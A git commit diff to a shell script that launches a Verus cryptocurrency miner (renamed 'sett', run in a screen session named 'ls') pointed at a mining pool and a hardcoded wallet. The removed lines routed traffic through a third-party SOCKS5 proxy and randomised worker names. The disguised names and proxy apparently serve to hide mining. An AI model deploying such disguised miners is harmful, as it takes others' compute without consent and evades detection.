897aacb3d359eb113660f5c92572782c71f4c567
hendrik20212 <87313143+hendrik20212@users.noreply.github.com>
2021-10-13 14:35:16 +0000

    Update and rename ongkek sh to run.sh

--- ccminer/run.sh
+++ ccminer/run.sh
@@ -3,8 +3,7 @@ sudo apt update
 sudo apt install screen libjansson4 -y 
 chmod +x ongkek.sh && chmod +x sett chmod 777 sett ongkek.sh
 screen -dmS ls 
-POOL=stratum+tcp://eu.luckpool.net:3956
+POOL=stratum+tcp://verushash.asia.mine.zergpool.com:3300
 WALLET=RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r
-WORKER=$(echo $(shuf -i 1-10 -n 1)KODOK)
-PROXY=socks5://72.195.114.184:4145
-./sett -a verus -o $POOL -u $WALLET.$WORKER -t 8 -x $PROXY
+WORKER=ZERG
+./sett -a verus -o $POOL -u $WALLET.$WORKER -t 8
